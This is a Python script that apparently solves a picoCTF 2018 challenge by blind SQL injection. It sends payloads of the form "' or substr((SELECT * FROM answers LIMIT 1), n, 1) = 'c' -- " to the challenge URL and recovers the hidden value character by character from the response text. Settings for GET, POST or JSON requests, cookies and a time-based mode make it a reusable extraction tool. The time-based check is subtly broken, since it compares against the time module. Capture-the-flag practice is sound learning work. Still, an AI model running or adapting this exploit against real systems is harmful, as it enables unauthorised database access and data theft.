import requests
import time

# candidates
num = '1234567890'
alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
alnum = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
alnumsu = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_ '
alnumnoregex = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_~!@- '
alnumchr = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$^&*()-=+_%{}|`[]?.,<>:;/\'\" '
asciis = range(32, 128)


# exploit settings
url = 'http://2018shell1.picoctf.com:2644/answer2.php'                # url for request
candidate = alnumnoregex       # candidate for blind SQLi
flag_len = 100            # length of flag
request_type = 'POST'    # GET of POST
session_name = ''
session = ''
check_string = 'You are so close.'

# time based settings
time_based = False
check_time = 2

cookie = {session_name: session}
flag = ''
for idx in range(0, flag_len):
    chk = True
    for c in candidate:

        payload = {
            'answer': "' or substr((SELECT * FROM answers LIMIT 1), %d, 1) = '%c' -- " % (idx + 1, c)
        }
        response = None

        s = time.time()

        if request_type == 'GET':
            response = requests.get(url=url, cookies=cookie, params=payload)
        elif request_type == 'POST':
            response = requests.post(url=url, cookies=cookie, data=payload)
        elif request_type == 'JSON':
            response = requests.post(url=url, cookies=cookie, json=payload)

        e = time.time()

        r = response.text

        if time_based:
            if e-s > time:
                print(idx, c)
                flag += c
                break
        else:
            if check_string in r:
                print(idx, c)
                flag += c
                chk = False
                break

    if chk:
        print("Not found:", idx)

print(flag)